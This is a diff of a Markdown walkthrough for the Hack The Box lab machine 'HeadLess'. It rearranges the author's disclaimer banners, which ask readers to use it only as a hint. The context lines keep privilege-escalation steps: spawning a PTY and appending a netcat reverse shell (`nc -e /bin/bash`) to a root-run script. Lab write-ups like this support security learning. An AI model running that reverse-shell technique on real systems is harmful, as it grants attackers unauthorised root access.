@@ -1,3 +1,10 @@
+# HTB Machine Walkthrough: HeadLess
+> [!IMPORTANT]  
+> **Please use this as a hint or guide if you're blocked at some point of this machine, i make those files for myself and to help some friends that are also doing those machines.**
+
+
+> [!NOTE]  
+> **Try to get as far as you can by yourself or you will never learn to make machines alone. Hope you the best and happy hacking <3.**
 
 # Task List
 
@@ -92,15 +99,6 @@ Use `python3 -c "import pty; pty.spawn('/bin/bash')"` to spawn a shell
 - Modify `initdb.sh` to append: `nc -e /bin/bash xx.xx.xx.xx PORT`
 - Open a new terminal and use `nc -lvp PORT`
 - Execute the script
-
-> [!IMPORTANT]  
-> **Please use this as a hint or guide if you're blocked at some point of this machine, i make those files for myself and to help some friends that are also doing those machines.**
-
-
-> [!NOTE]  
-> **Try to get as far as you can by yourself or you will never learn to make machines alone. Hope you the best and happy hacking <3.**
-
-**Extra Hint:** Use the same process as for the user shell access
 
 **Result:** Access to a shell as the root user  
 Navigate to the root directory and use `cat root.txt`
